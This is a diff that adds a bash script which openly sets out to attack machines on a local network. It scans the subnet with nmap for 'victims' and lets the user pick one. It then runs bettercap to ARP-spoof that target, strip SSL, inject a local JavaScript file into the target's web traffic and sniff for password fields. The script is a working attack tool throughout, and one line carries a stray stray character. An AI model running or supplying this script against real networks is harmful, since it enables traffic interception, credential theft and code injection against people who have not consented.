@@ -1,0 +1,97 @@
+#!/usr/bin/env bash
+
+# States
+readonly SCAN_ROUTER=0    # finding the router
+readonly SCAN_TARGETS=1   # finding the target victim
+readonly SCAN_DONE=2      # finished
+
+# Globals
+scan_state=$SCAN_ROUTER
+
+# find the host attacker ip
+host_ip=$(ip address |grep 'inet ' |grep -v host|xargs|cut -d " " -f 2|cut -d"/" -f1)t
+
+# find the network router ip
+router_ip=$(ip route |grep 'default'|cut -d " " -f 3)
+
+# find the attacker mac address
+mac_addr=$(ip link show | grep ether | xargs | cut -d' ' -f2)
+
+# Scans the router for potential target victims
+function scan_router() {
+  echo -e "\nScanning router for targets...\n"
+
+  nmap -sn $router_ip/24 | grep "Nmap scan report for" | grep -v $host_ip |grep -v $router_ip| cut -d " " -f 5
+
+  scan_state=$SCAN_TARGETS
+}
+
+# Scans a potential victim for more information
+function scan_target() {
+  local target=$1
+
+  echo -e "\nScanning target $target...\n"
+
+  result=$(nmap -T4 -A $target | grep -v Nmap)
+
+  echo "$result"
+
+  echo -en "\nSelect $target for attack (y/N)? "
+
+  read select
+
+  case "$select" in
+    y|Y*)
+      mac_addr=$(echo "$result" | grep "MAC:" | cut -d' ' -f10)
+      echo -e "\nVictims MAC address is $mac_addr"
+      scan_state=$SCAN_DONE
+      ;;
+    *)
+      ;;
+  esac
+}
+
+function scan_targets() {
+  read -p $'\nEnter the IP to inspect (press enter to rescan) ' target
+
+  case "$target" in
+    '')
+      scan_router
+      ;;
+    *)
+      scan_target $target
+      ;;
+  esac
+}
+
+echo -e "\nYour IP is $host_ip"
+
+echo -e "\nYour MAC Address is $mac_addr"
+
+echo -e "\nThe router IP is $router_ip"
+
+echo -en "\nPress enter to scan the router for victims "
+
+read
+
+while [ $scan_state -ne $SCAN_DONE ]; do
+
+  case "$scan_state" in
+    0)
+      scan_router $router
+      ;;
+    1)
+      scan_targets $router
+      ;;
+    *)
+      echo -e "\ninvalid state"
+      ;;
+  esac
+done
+
+echo -en "\nPress enter to start attack on $target "
+
+read
+
+sudo bettercap -iface eth0 -eval "set net.sniff.local true; set net.sniff.regexp '.*password=.+'; set net.sniff.verbose true; net.sniff on; net.probe on; set arp.spoof.internal true; set arp.spoof.targets $target; arp.spoof on; set http.proxy.injectjs ${PWD}/index.js; set http.proxy.sslstrip true; http.proxy on"
+
